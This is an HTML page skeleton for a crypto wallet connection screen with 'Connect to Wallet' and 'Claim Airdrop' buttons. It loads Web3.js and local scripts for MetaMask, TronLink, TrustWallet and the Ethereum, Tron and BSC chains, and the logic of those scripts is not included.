<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Integration</title>
    <link rel="stylesheet" href="/wallets/css/styles.css"> <!-- Updated CSS file link -->
</head>
<body>
    <h1>Connect Your Wallet</h1>

    <button id="connectButton">Connect to Wallet</button>
    <button id="claimAirdropButton" disabled>Claim Airdrop</button>

    <!-- Load Web3.js -->
    <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script> <!-- Make sure the correct version of Web3.js is included -->
    
    <!-- Load Common.js first, which contains shared variables like web3, contractAddress, etc. -->
    <script src="/wallets/js/common.js"></script> <!-- Common.js file link -->

    <!-- Load Wallet-specific JS files after common.js -->
    <script src="/wallets/js/metamask.js"></script> <!-- MetaMask integration -->
    <script src="/wallets/js/tronlink.js"></script> <!-- TronLink integration -->
    <script src="/wallets/js/trustwallet.js"></script> <!-- TrustWallet integration -->
    <script src="/wallets/js/eth.js"></script> <!-- Ethereum logic -->
    <script src="/wallets/js/tron.js"></script> <!-- Tron logic -->
    <script src="/wallets/js/bsc.js"></script> <!-- BSC logic -->

</body>
</html>
